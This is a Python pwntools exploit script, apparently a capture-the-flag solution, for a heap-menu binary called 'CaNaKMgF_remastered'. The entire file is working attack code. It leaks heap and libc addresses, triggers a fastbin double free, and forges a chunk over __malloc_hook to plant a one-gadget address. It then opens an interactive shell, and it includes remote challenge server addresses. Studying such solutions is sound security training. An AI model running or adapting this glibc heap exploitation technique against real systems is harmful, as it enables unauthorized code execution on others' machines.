#!/usr/bin/env python

from pwn import *
context(os='linux', arch='amd64')
BINARY = './CaNaKMgF_remastered'

WTIME = 0.3
idx = 0

def alloc(r, size, data):
    global idx 
    r.sendline('1')
    r.recvuntil('Length? ')
    r.sendline(str(size))
    sleep(WTIME)
    r.send(data)
    r.recvuntil('away\n')
    res = idx
    idx += 1
    return res

def free(r, i):
    global idx
    r.sendline('3')
    r.recvuntil('Num? ')
    r.sendline(str(i))
    r.recvuntil('away\n')

def print_func(r, i):
    r.sendline('4')
    r.recvuntil('Num? ')
    r.sendline(str(i))
    data = r.recvuntil('\n1. ', drop=True)
    r.recvuntil('away\n')
    return data


def exploit():
    global idx 
    REMOTE = 0
    if REMOTE:
        LIBC = "/home/paulch/cana_/libc.so.6"
        #r = remote('128.199.247.60', 10001) #first
        r = remote('128.199.85.217', 10001) # second
    else:
        LIBC = "/lib/x86_64-linux-gnu/libc-2.24.so"
        r = process(BINARY)
    gdb.attach(r)
    elf = ELF(BINARY)
    libc = ELF(LIBC)

    r.recvuntil('5. Run away\n')

    size = 0x60
      
    alloc(r, 0x10, '/bin/sh')
    idx0 = alloc(r, size, 'AAAA')
    idx1 = alloc(r, size, 'AAAA')
    idx2 = alloc(r, 0x10, 'AAAA')
    idx3 = alloc(r, 0x100, 'AAAA')
    idx2 = alloc(r, 0x10, 'AAAA')


    free(r, idx0)
    free(r, idx1)
    heap_leak = print_func(r, idx1) #leak heap
    free(r, idx0) #double free

    heap_leak += '\0' * (8 - len(heap_leak))
    heap_base = u64(heap_leak) & ((1<<64) - 0x1000)

    print 'heap_base', hex(heap_base)

    free(r, idx3)
    libc_leak = print_func(r, idx3) #leak libc

    libc_leak += '\0' * (8 - len(libc_leak))
    libc_leak = u64(libc_leak)
    print hex(libc_leak)
    main_arena_entry = 0x398B58
    libc_base = libc_leak - main_arena_entry

    malloc_hook = libc_base + libc.symbols["__malloc_hook"]
    system_addr = libc_base + libc.symbols["system"]
    free_hook = libc_base + libc.symbols['__free_hook']
    
    print 'libc_base', hex(libc_base)
    print 'free_hook', hex(free_hook)
    print 'malloc_hook', hex(malloc_hook)

    fd_ptr = p64(malloc_hook - 0x1b - 8)
    alloc(r, size, fd_ptr)
    alloc(r, size, 'C' * 8)

    alloc(r, size, 'D' * 0x8)
        
    rce_gadget = 0xd6845
    print hex(libc_base + rce_gadget)
    p = ''
    p += 'Q' * 3
    p += 'Q' * 16
    p += p64(libc_base + rce_gadget)
    idx_ = alloc(r, size, p) #overwrite malloc_hook to rce address.

    # trigger the double free in interactive
    
    r.interactive()
    
if __name__ == '__main__':
    exploit()
